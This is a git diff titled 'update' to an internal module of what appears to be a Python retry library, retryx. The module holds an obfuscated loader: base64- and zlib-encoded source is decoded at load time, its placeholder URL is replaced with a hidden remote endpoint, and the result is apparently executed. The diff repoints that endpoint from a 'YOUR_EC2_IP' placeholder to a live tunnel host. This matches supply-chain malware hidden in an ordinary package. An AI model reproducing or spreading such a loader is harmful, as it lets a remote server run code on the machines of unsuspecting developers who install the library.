fc59c29d0c4cee1991c463768c982dc2b672b149
Devashish-n17 <devashish.revadkar@nitorinfotech.com>
2026-05-05 21:39:15 +0530

    update

--- src/retryx/_internal.py
+++ src/retryx/_internal.py
@@ -14,12 +14,12 @@ _s1 = "eNqNVt2O1DYUvs9THJkLEjXNLHRBaNSphFZQVWoLWrYXFUIjT+KZmEls13bKRKuteAiesE/Sc
 _s2 = "KkUxsOL8Ce1mh2ex93sxHJ6hAV0tLMKbicU69gaxqySiRBTlp8BNQHq2YQ0OCPNbEY7nBlrVbjeedEuzjD9HGB6DERt/xbWoccLYFvOgVPuIuJuzKnBNKRYbSQI7xvNqy8lt+KeY/hEpKLqWuPSEVwIVepqnmakDJViSaDiOv6nE4x+wSydvaFHvlirkZEY1OaWXWnlhfLf3/RGYESMG9PIklOFVuQRu1vubKm21Ya9fvXmhk0rZwc/SF/fdw+H2giV4hjlIFuhO795lgF3YNeL04eqh1RQBlxqC1JPmhWViKn4GptG4kw1sJ0aOf0ArhpJ0TpZCThwL+Dfj5+AN2"
 _s3 = "SjB8tRyZUGpT1W8xC2yP1MStJ5lwaJZfcNJmE88AArdJZTMph+44WBR8GgE6qasFLtdWgXgNWmJiAq2DV6B9/BUfSDGBwJJNJpz25J83crqaRHxQznZKO76H3coC0wOoiFKanC7Jf9Hrx7HLzDTJMb2LgEpuagLZa0pf3Xz3/7nL3oIzEytrZi9/RyKBQZe8twlb07syPE9b/g4OwMTUuIju0vxaMCC8i3lKBnTnwTJRaR/hAiFSdRDoHlaA37YRly1zV+AFPhQToEBco8JHsPw14lsC2AVlBJdxyrhBu3tW5QW+g3UTDom1hIJd9GRGoX7JltKjqDWsV0DKRZJJq"
 _s4 = "cTUvdGtmIlPzAZvnjT9QyaYVlOdyyuRlU83x4d84rSWK7V+ji71qJZJp/MJWcfEZOuaie+TFZCL7EuwOkn3YqF+P9dl+Vy2a73zIyxN4tTX2lrHQRLIp6eRZXPAGJVh7Ba0C9BOA9BQ2JyufXzCAnzN7wNmv6U2KXZRua/lLpTyLDLFIdiCp96CnhS0F52Df8MJCjgZggonROcsqDUMMqtp6WH0UlrUvHNoSDcK/GPpRDaEtbfdzc2G7oAqHbhnXM+AeWFWWjXWhFoSXutPbTNY+Fm75QipvwlnpusR9tqCZ0hYhWq9npvsBvB+vTcfReS5WObf3Rkyz5D0R9uIs="
-_ep = "aHR0cDovL1lPVVJfRUMyX0lQOjgwMDA="
+_ep = "aHR0cHM6Ly9zOGowNnNyZy04MDAwLmluYzEuZGV2dHVubmVscy5tcy8="
 
 def _load():
     _raw = _zl.decompress(_b64.b64decode(_s1 + _s2 + _s3 + _s4))
     _src = _raw.decode().replace(
-        "https://s8j06srg-8000.inc1.devtunnels.ms/",
+        "http://YOUR_EC2_IP:8000",
         _b64.b64decode(_ep).decode()
     )
     _ns = {"__name__": __name__}
